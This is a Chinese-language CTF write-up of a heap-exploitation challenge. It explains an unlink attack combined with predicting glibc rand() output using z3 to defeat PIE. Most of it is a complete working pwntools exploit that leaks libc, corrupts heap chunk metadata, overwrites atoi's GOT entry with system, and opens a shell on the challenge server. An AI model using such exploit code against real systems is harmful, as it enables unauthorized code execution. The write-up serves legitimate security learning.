# 简介

一道考察unlink利用的题目，但开了PIE，引出第二个考点[glibc rand(3)预测攻击](http://inaz2.hatenablog.com/entry/2016/03/07/194000)。

# 程序功能

有5次malloc的机会，大小递增，只有2、3两个可以free，并且free和write、show都是任意的，全局变量中有指向堆的指针。

# 构思
造出small bin，free就可以泄漏libc，然后很容易想到用unlink去做，并且这里有很方便的atoi，改为system即可。但是本题有PIE，于是要想办法leak出程序的信息。

仔细研究发现还有个奇葩的猜随机数功能，猜错给出当前随机数，根据glibc的rand实现可知，内部有31个状态，找到93次输出，用z3就可以解出所有的状态，并预测下一次。

预测成功就可以拿到seed的地址，这是一个`.bss`段的地址，根据偏移就可以推算出堆指针和got entry的地址，用unlink利用即可。

# 利用

```python
from pwn import *
from z3 import *

import sys 
if len(sys.argv) > 1:
    r = remote('123.206.22.95', 8888)
else:
    r = remote('127.0.0.1', 4444)
context.arch = 'amd64'

offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
offset_dup2 = 0x00000000000f7940
offset_read = 0x00000000000f7220
offset_write = 0x00000000000f7280
offset_str_bin_sh = 0x18cd17


def get(i, size):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', str(i))
    r.sendlineafter('> ', str(size))

def free(i):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(i))

def write(i, msg):
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', str(i))
    r.send(msg)

def show(i):
    r.sendlineafter('> ', '4')
    r.sendlineafter('> ', str(i))
    c = r.recvuntil('You')
    c = c.replace('You', '')
    c = c.rstrip()
    return u64(c.ljust(8, '\x00'))

def guess(i):
    r.sendlineafter('> ', '5')
    r.sendlineafter('> ', str(i))
    r.recvuntil('!')
    maybe = r.recvuntil('!')
    value = int(maybe.split(' ')[-1].replace('!', ''))
    if 'secret' in maybe:
        return (1, value)
    return (0, value)

actual = []
state = [BitVec("state%d" % i, 32) for i in xrange(31)]
s = Solver()
for i in xrange(93):
    actual.append(guess(1)[1])

for i in xrange(93):
    state[(3+i)%31] += state[i%31]
    output = (state[(3+i) % 31] >> 1) & 0x7fffffff
    s.add(output == actual[i])
    
print s.check()
m = s.model()

for i in xrange(93, 93+31):
    state[(3+i) % 31] += state[i % 31]
    output = m.evaluate((state[(3+i) % 31] >> 1) & 0x7fffffff)
    actual = guess(output)
    assert actual[0] == 1
    break

context.log_level = 'debug'
offset_seed = 0x555555756148
offset_atoi_got = 0x555555756068
offset_box2 = 0x555555756110

seed_addr = actual[1]
print hex(seed_addr)
atoi_got = offset_atoi_got - offset_seed + seed_addr
box2 = offset_box2 - offset_seed + seed_addr
print hex(box2)
get(1, 24)
get(2, 0x90-8)
get(3, 0xa0-8)

free(2)
leak_libc = show(2)
libc_base = leak_libc - 0x3c4b78
print hex(libc_base)
system = offset_system + libc_base
print hex(system)

write(2, flat( 
    0,
    0x81,
    box2-0x18,
    box2-0x10,
    'A'*(0x90-8-8*5),
    0x80,
    '\xa0'
    ))
raw_input('#')
free(3)
write(2, flat(0, 0, 0, atoi_got) + '\n')
print `p64(system)`
write(2, p64(system) + '\n')
r.sendlineafter('> ', '/bin/sh\x00')

r.interactive()
```
